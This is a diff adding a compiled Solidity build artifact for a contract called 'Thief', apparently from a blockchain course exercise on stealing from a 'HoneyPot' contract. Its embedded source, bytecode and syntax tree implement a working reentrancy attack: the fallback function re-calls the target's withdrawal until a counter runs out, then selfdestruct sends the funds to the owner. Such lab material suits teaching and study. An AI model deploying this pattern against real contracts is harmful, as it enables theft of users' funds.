@@ -1,0 +1,1240 @@
+{
+  "contractName": "Thief",
+  "abi": [
+    {
+      "constant": false,
+      "inputs": [],
+      "name": "get",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [],
+      "name": "goodbye",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "name": "honeypotAddress",
+          "type": "address"
+        },
+        {
+          "name": "howManyTimes",
+          "type": "uint256"
+        }
+      ],
+      "payable": true,
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "payable": true,
+      "stateMutability": "payable",
+      "type": "fallback"
+    }
+  ],
+  "bytecode": "0x606060405260405160408061030783398101604052808051906020019091908051906020019091905050600033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550826000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550816002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561013a57600080fd5b6125ee5a03f1151561014b57600080fd5b505050505050506101a6806101616000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c1461006257806375fc8e3c14610077575b600060025411156100605761005f61008c565b5b005b341561006d57600080fd5b61007561008c565b005b341561008257600080fd5b61008a61013f565b005b6000600260008154809291906001900391905055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561012857600080fd5b6102c65a03f1151561013957600080fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820e4af702f013c0f6711e46ef2fe503907bb398e4548b8c79809031d47853366bb0029",
+  "deployedBytecode": "0x60606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c1461006257806375fc8e3c14610077575b600060025411156100605761005f61008c565b5b005b341561006d57600080fd5b61007561008c565b005b341561008257600080fd5b61008a61013f565b005b6000600260008154809291906001900391905055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561012857600080fd5b6102c65a03f1151561013957600080fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820e4af702f013c0f6711e46ef2fe503907bb398e4548b8c79809031d47853366bb0029",
+  "sourceMap": "51:702:2:-;;;153:283;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;336:25;255:10;247:5;;:18;;;;;;;;;;;;;;;;;;284:15;273:8;;:26;;;;;;;;;;;;;;;;;;315:12;307:5;:20;;;;373:8;;;;;;;;;;;336:46;;390:16;:20;;;417:9;390:39;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;153:283;;;51:702;;;;;;",
+  "deployedSourceMap": "51:702:2:-;;;;;;;;;;;;;;;;;;;;;;;;;;643:1;635:5;;:9;631:39;;;656:5;:3;:5::i;:::-;631:39;51:702;442:136;;;;;;;;;;;;;;682:69;;;;;;;;;;;;;;442:136;495:25;480:5;;:7;;;;;;;;;;;;;;532:8;;;;;;;;;;;495:46;;549:16;:20;;;:22;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;442:136;:::o;682:69::-;738:5;;;;;;;;;;;725:19;;",
+  "source": "pragma solidity 0.4.18;\n\nimport \"./HoneyPot.sol\";\n\ncontract Thief {\n    address honeypot;\n    address owner;\n    uint count;\n    bytes32 signature;\n\n    function Thief(address honeypotAddress, uint howManyTimes)\n    public\n    payable\n    {\n      owner = msg.sender;\n      honeypot = honeypotAddress;\n      count = howManyTimes;\n\n      HoneyPot honeypotInstance = HoneyPot(honeypot);\n      honeypotInstance.put.value(msg.value)();\n    }\n\n    function get()\n    public\n    {\n      count--;\n      HoneyPot honeypotInstance = HoneyPot(honeypot);\n      honeypotInstance.get();\n    }\n\n    function ()\n    public\n    payable\n    {\n      if (count > 0) {\n        get();\n      }\n    }\n\n    function goodbye ()\n    public\n    {\n      selfdestruct(owner);\n    }\n}\n",
+  "sourcePath": "/home/naps62/projects/b9lab-honeypot-theft/contracts/Thief.sol",
+  "ast": {
+    "attributes": {
+      "absolutePath": "/home/naps62/projects/b9lab-honeypot-theft/contracts/Thief.sol",
+      "exportedSymbols": {
+        "Thief": [
+          200
+        ]
+      }
+    },
+    "children": [
+      {
+        "attributes": {
+          "literals": [
+            "solidity",
+            "0.4",
+            ".18"
+          ]
+        },
+        "id": 115,
+        "name": "PragmaDirective",
+        "src": "0:23:2"
+      },
+      {
+        "attributes": {
+          "SourceUnit": 57,
+          "absolutePath": "/home/naps62/projects/b9lab-honeypot-theft/contracts/HoneyPot.sol",
+          "file": "./HoneyPot.sol",
+          "scope": 201,
+          "symbolAliases": [
+            null
+          ],
+          "unitAlias": ""
+        },
+        "id": 116,
+        "name": "ImportDirective",
+        "src": "25:24:2"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            200
+          ],
+          "name": "Thief",
+          "scope": 201
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "honeypot",
+              "scope": 200,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "address",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "address",
+                  "type": "address"
+                },
+                "id": 117,
+                "name": "ElementaryTypeName",
+                "src": "72:7:2"
+              }
+            ],
+            "id": 118,
+            "name": "VariableDeclaration",
+            "src": "72:16:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "owner",
+              "scope": 200,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "address",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "address",
+                  "type": "address"
+                },
+                "id": 119,
+                "name": "ElementaryTypeName",
+                "src": "94:7:2"
+              }
+            ],
+            "id": 120,
+            "name": "VariableDeclaration",
+            "src": "94:13:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "count",
+              "scope": 200,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "uint256",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "uint",
+                  "type": "uint256"
+                },
+                "id": 121,
+                "name": "ElementaryTypeName",
+                "src": "113:4:2"
+              }
+            ],
+            "id": 122,
+            "name": "VariableDeclaration",
+            "src": "113:10:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "signature",
+              "scope": 200,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "bytes32",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "bytes32",
+                  "type": "bytes32"
+                },
+                "id": 123,
+                "name": "ElementaryTypeName",
+                "src": "129:7:2"
+              }
+            ],
+            "id": 124,
+            "name": "VariableDeclaration",
+            "src": "129:17:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": true,
+              "modifiers": [
+                null
+              ],
+              "name": "Thief",
+              "payable": true,
+              "scope": 200,
+              "stateMutability": "payable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "honeypotAddress",
+                      "scope": 161,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 125,
+                        "name": "ElementaryTypeName",
+                        "src": "168:7:2"
+                      }
+                    ],
+                    "id": 126,
+                    "name": "VariableDeclaration",
+                    "src": "168:23:2"
+                  },
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "howManyTimes",
+                      "scope": 161,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "uint256",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "uint",
+                          "type": "uint256"
+                        },
+                        "id": 127,
+                        "name": "ElementaryTypeName",
+                        "src": "193:4:2"
+                      }
+                    ],
+                    "id": 128,
+                    "name": "VariableDeclaration",
+                    "src": "193:17:2"
+                  }
+                ],
+                "id": 129,
+                "name": "ParameterList",
+                "src": "167:44:2"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 130,
+                "name": "ParameterList",
+                "src": "239:0:2"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 120,
+                              "type": "address",
+                              "value": "owner"
+                            },
+                            "id": 131,
+                            "name": "Identifier",
+                            "src": "247:5:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "sender",
+                              "referencedDeclaration": null,
+                              "type": "address"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 212,
+                                  "type": "msg",
+                                  "value": "msg"
+                                },
+                                "id": 132,
+                                "name": "Identifier",
+                                "src": "255:3:2"
+                              }
+                            ],
+                            "id": 133,
+                            "name": "MemberAccess",
+                            "src": "255:10:2"
+                          }
+                        ],
+                        "id": 134,
+                        "name": "Assignment",
+                        "src": "247:18:2"
+                      }
+                    ],
+                    "id": 135,
+                    "name": "ExpressionStatement",
+                    "src": "247:18:2"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 118,
+                              "type": "address",
+                              "value": "honeypot"
+                            },
+                            "id": 136,
+                            "name": "Identifier",
+                            "src": "273:8:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 126,
+                              "type": "address",
+                              "value": "honeypotAddress"
+                            },
+                            "id": 137,
+                            "name": "Identifier",
+                            "src": "284:15:2"
+                          }
+                        ],
+                        "id": 138,
+                        "name": "Assignment",
+                        "src": "273:26:2"
+                      }
+                    ],
+                    "id": 139,
+                    "name": "ExpressionStatement",
+                    "src": "273:26:2"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "uint256"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 122,
+                              "type": "uint256",
+                              "value": "count"
+                            },
+                            "id": 140,
+                            "name": "Identifier",
+                            "src": "307:5:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 128,
+                              "type": "uint256",
+                              "value": "howManyTimes"
+                            },
+                            "id": 141,
+                            "name": "Identifier",
+                            "src": "315:12:2"
+                          }
+                        ],
+                        "id": 142,
+                        "name": "Assignment",
+                        "src": "307:20:2"
+                      }
+                    ],
+                    "id": 143,
+                    "name": "ExpressionStatement",
+                    "src": "307:20:2"
+                  },
+                  {
+                    "attributes": {
+                      "assignments": [
+                        145
+                      ]
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "constant": false,
+                          "name": "honeypotInstance",
+                          "scope": 161,
+                          "stateVariable": false,
+                          "storageLocation": "default",
+                          "type": "contract HoneyPot",
+                          "value": null,
+                          "visibility": "internal"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "contractScope": null,
+                              "name": "HoneyPot",
+                              "referencedDeclaration": 56,
+                              "type": "contract HoneyPot"
+                            },
+                            "id": 144,
+                            "name": "UserDefinedTypeName",
+                            "src": "336:8:2"
+                          }
+                        ],
+                        "id": 145,
+                        "name": "VariableDeclaration",
+                        "src": "336:25:2"
+                      },
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "contract HoneyPot",
+                          "type_conversion": true
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_address",
+                                  "typeString": "address"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 56,
+                              "type": "type(contract HoneyPot)",
+                              "value": "HoneyPot"
+                            },
+                            "id": 146,
+                            "name": "Identifier",
+                            "src": "364:8:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 118,
+                              "type": "address",
+                              "value": "honeypot"
+                            },
+                            "id": 147,
+                            "name": "Identifier",
+                            "src": "373:8:2"
+                          }
+                        ],
+                        "id": 148,
+                        "name": "FunctionCall",
+                        "src": "364:18:2"
+                      }
+                    ],
+                    "id": 149,
+                    "name": "VariableDeclarationStatement",
+                    "src": "336:46:2"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "function () payable external",
+                              "type_conversion": false
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_uint256",
+                                      "typeString": "uint256"
+                                    }
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "member_name": "value",
+                                  "referencedDeclaration": null,
+                                  "type": "function (uint256) returns (function () payable external)"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "isConstant": false,
+                                      "isLValue": false,
+                                      "isPure": false,
+                                      "lValueRequested": false,
+                                      "member_name": "put",
+                                      "referencedDeclaration": 24,
+                                      "type": "function () payable external"
+                                    },
+                                    "children": [
+                                      {
+                                        "attributes": {
+                                          "argumentTypes": null,
+                                          "overloadedDeclarations": [
+                                            null
+                                          ],
+                                          "referencedDeclaration": 145,
+                                          "type": "contract HoneyPot",
+                                          "value": "honeypotInstance"
+                                        },
+                                        "id": 150,
+                                        "name": "Identifier",
+                                        "src": "390:16:2"
+                                      }
+                                    ],
+                                    "id": 153,
+                                    "name": "MemberAccess",
+                                    "src": "390:20:2"
+                                  }
+                                ],
+                                "id": 154,
+                                "name": "MemberAccess",
+                                "src": "390:26:2"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "member_name": "value",
+                                  "referencedDeclaration": null,
+                                  "type": "uint256"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 212,
+                                      "type": "msg",
+                                      "value": "msg"
+                                    },
+                                    "id": 155,
+                                    "name": "Identifier",
+                                    "src": "417:3:2"
+                                  }
+                                ],
+                                "id": 156,
+                                "name": "MemberAccess",
+                                "src": "417:9:2"
+                              }
+                            ],
+                            "id": 157,
+                            "name": "FunctionCall",
+                            "src": "390:37:2"
+                          }
+                        ],
+                        "id": 158,
+                        "name": "FunctionCall",
+                        "src": "390:39:2"
+                      }
+                    ],
+                    "id": 159,
+                    "name": "ExpressionStatement",
+                    "src": "390:39:2"
+                  }
+                ],
+                "id": 160,
+                "name": "Block",
+                "src": "239:197:2"
+              }
+            ],
+            "id": 161,
+            "name": "FunctionDefinition",
+            "src": "153:283:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "get",
+              "payable": false,
+              "scope": 200,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 162,
+                "name": "ParameterList",
+                "src": "454:2:2"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 163,
+                "name": "ParameterList",
+                "src": "472:0:2"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "--",
+                          "prefix": false,
+                          "type": "uint256"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 122,
+                              "type": "uint256",
+                              "value": "count"
+                            },
+                            "id": 164,
+                            "name": "Identifier",
+                            "src": "480:5:2"
+                          }
+                        ],
+                        "id": 165,
+                        "name": "UnaryOperation",
+                        "src": "480:7:2"
+                      }
+                    ],
+                    "id": 166,
+                    "name": "ExpressionStatement",
+                    "src": "480:7:2"
+                  },
+                  {
+                    "attributes": {
+                      "assignments": [
+                        168
+                      ]
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "constant": false,
+                          "name": "honeypotInstance",
+                          "scope": 179,
+                          "stateVariable": false,
+                          "storageLocation": "default",
+                          "type": "contract HoneyPot",
+                          "value": null,
+                          "visibility": "internal"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "contractScope": null,
+                              "name": "HoneyPot",
+                              "referencedDeclaration": 56,
+                              "type": "contract HoneyPot"
+                            },
+                            "id": 167,
+                            "name": "UserDefinedTypeName",
+                            "src": "495:8:2"
+                          }
+                        ],
+                        "id": 168,
+                        "name": "VariableDeclaration",
+                        "src": "495:25:2"
+                      },
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "contract HoneyPot",
+                          "type_conversion": true
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_address",
+                                  "typeString": "address"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 56,
+                              "type": "type(contract HoneyPot)",
+                              "value": "HoneyPot"
+                            },
+                            "id": 169,
+                            "name": "Identifier",
+                            "src": "523:8:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 118,
+                              "type": "address",
+                              "value": "honeypot"
+                            },
+                            "id": 170,
+                            "name": "Identifier",
+                            "src": "532:8:2"
+                          }
+                        ],
+                        "id": 171,
+                        "name": "FunctionCall",
+                        "src": "523:18:2"
+                      }
+                    ],
+                    "id": 172,
+                    "name": "VariableDeclarationStatement",
+                    "src": "495:46:2"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "get",
+                              "referencedDeclaration": 48,
+                              "type": "function () external"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 168,
+                                  "type": "contract HoneyPot",
+                                  "value": "honeypotInstance"
+                                },
+                                "id": 173,
+                                "name": "Identifier",
+                                "src": "549:16:2"
+                              }
+                            ],
+                            "id": 175,
+                            "name": "MemberAccess",
+                            "src": "549:20:2"
+                          }
+                        ],
+                        "id": 176,
+                        "name": "FunctionCall",
+                        "src": "549:22:2"
+                      }
+                    ],
+                    "id": 177,
+                    "name": "ExpressionStatement",
+                    "src": "549:22:2"
+                  }
+                ],
+                "id": 178,
+                "name": "Block",
+                "src": "472:106:2"
+              }
+            ],
+            "id": 179,
+            "name": "FunctionDefinition",
+            "src": "442:136:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "",
+              "payable": true,
+              "scope": 200,
+              "stateMutability": "payable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 180,
+                "name": "ParameterList",
+                "src": "593:2:2"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 181,
+                "name": "ParameterList",
+                "src": "623:0:2"
+              },
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "falseBody": null
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": ">",
+                          "type": "bool"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 122,
+                              "type": "uint256",
+                              "value": "count"
+                            },
+                            "id": 182,
+                            "name": "Identifier",
+                            "src": "635:5:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "hexvalue": "30",
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "lValueRequested": false,
+                              "subdenomination": null,
+                              "token": "number",
+                              "type": "int_const 0",
+                              "value": "0"
+                            },
+                            "id": 183,
+                            "name": "Literal",
+                            "src": "643:1:2"
+                          }
+                        ],
+                        "id": 184,
+                        "name": "BinaryOperation",
+                        "src": "635:9:2"
+                      },
+                      {
+                        "children": [
+                          {
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "arguments": [
+                                    null
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "tuple()",
+                                  "type_conversion": false
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        null
+                                      ],
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 179,
+                                      "type": "function ()",
+                                      "value": "get"
+                                    },
+                                    "id": 185,
+                                    "name": "Identifier",
+                                    "src": "656:3:2"
+                                  }
+                                ],
+                                "id": 186,
+                                "name": "FunctionCall",
+                                "src": "656:5:2"
+                              }
+                            ],
+                            "id": 187,
+                            "name": "ExpressionStatement",
+                            "src": "656:5:2"
+                          }
+                        ],
+                        "id": 188,
+                        "name": "Block",
+                        "src": "646:24:2"
+                      }
+                    ],
+                    "id": 189,
+                    "name": "IfStatement",
+                    "src": "631:39:2"
+                  }
+                ],
+                "id": 190,
+                "name": "Block",
+                "src": "623:53:2"
+              }
+            ],
+            "id": 191,
+            "name": "FunctionDefinition",
+            "src": "584:92:2"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "goodbye",
+              "payable": false,
+              "scope": 200,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 192,
+                "name": "ParameterList",
+                "src": "699:2:2"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 193,
+                "name": "ParameterList",
+                "src": "717:0:2"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_address",
+                                  "typeString": "address"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 218,
+                              "type": "function (address)",
+                              "value": "selfdestruct"
+                            },
+                            "id": 194,
+                            "name": "Identifier",
+                            "src": "725:12:2"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 120,
+                              "type": "address",
+                              "value": "owner"
+                            },
+                            "id": 195,
+                            "name": "Identifier",
+                            "src": "738:5:2"
+                          }
+                        ],
+                        "id": 196,
+                        "name": "FunctionCall",
+                        "src": "725:19:2"
+                      }
+                    ],
+                    "id": 197,
+                    "name": "ExpressionStatement",
+                    "src": "725:19:2"
+                  }
+                ],
+                "id": 198,
+                "name": "Block",
+                "src": "717:34:2"
+              }
+            ],
+            "id": 199,
+            "name": "FunctionDefinition",
+            "src": "682:69:2"
+          }
+        ],
+        "id": 200,
+        "name": "ContractDefinition",
+        "src": "51:702:2"
+      }
+    ],
+    "id": 201,
+    "name": "SourceUnit",
+    "src": "0:754:2"
+  },
+  "compiler": {
+    "name": "solc",
+    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
+  },
+  "networks": {},
+  "schemaVersion": "1.0.1",
+  "updatedAt": "2018-01-08T18:49:07.834Z"
+}
